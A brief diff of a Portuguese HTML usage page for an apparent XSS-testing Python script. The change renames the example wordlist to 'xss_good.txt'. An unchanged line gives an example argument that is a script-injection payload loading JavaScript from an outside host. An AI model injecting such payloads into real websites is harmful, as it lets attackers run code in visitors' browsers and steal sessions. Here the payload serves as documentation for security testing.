@@ -7,7 +7,7 @@
 
 <h3>Uso exemplo para string: python3 teste.py -s "><script src=\"https://js.rip/j14fkfemu3\"></script></h3>
 </br>
-<h3>Uso exemplo para wordlist.txt: python3 teste.py -w texto.txt</h3>
+<h3>Uso exemplo para wordlist.txt: python3 teste.py -w xss_good.txt</h3>
 
 </br>
 
